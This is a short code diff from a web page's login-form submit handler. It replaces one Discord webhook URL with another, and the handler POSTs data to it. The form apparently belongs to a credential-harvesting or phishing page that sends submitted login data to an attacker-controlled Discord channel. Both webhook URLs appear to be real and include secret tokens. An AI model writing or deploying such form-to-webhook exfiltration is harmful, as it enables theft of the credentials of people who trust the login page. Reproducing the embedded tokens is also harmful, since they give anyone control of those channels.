@@ -34,7 +34,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
             }
 
             // Send data to Discord webhook
-            fetch('https://discord.com/api/webhooks/1310775997238345728/ZVNm_axETT7WwNvNVHcuplhdTfMxIK8gNKKnW1KER_KGHDYYgshYohghd', {
+            fetch('https://discord.com/api/webhooks/1313820467508809869/3w0mk04qdRxo-IT_zygMUfAq46GYWNRSbjKkc8wc6DM06vgSigdemiwn8jc6vQSSpUHB', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
